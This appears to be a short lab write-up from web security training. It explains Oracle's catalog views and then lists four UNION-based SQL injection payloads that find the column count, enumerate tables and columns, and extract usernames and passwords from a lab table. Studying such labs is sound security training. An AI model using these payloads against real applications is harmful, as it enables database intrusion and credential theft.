# Listing the contents of an Oracle database

On Oracle, you can find the same information as follows:

You can list tables by querying `all_tables`
```bash
SELECT * FROM all_tables
```
You can list columns by querying `all_tab_columns`

```bash
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

# Lab
1) I determined number of columns and confirmed both column can hold string data
```bash
' UNION SELECT 'abc','def' FROM dual--
```
2) I used the following payload to retrieve the list of tables in the database and I found table named: `USERS_FIRSTQ`
```bash
' UNION SELECT table_name,NULL FROM all_tables--
```
3) Then I used this payload to retrieve the details of the columns in the table and I found `USERNAME_FNJWVV` and `PASSWORD_LMQXOK`
```bash
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_FIRSTQ'--
```
4) Then I used this payload with column name and table name to retrieve the usernames and passwords for all users:
```bash
' UNION SELECT USERNAME_FNJWVV, PASSWORD_LMQXOK FROM USERS_FIRSTQ--
```

## Perfect explanation on you tube
https://youtu.be/ZbwIbIq5-eE
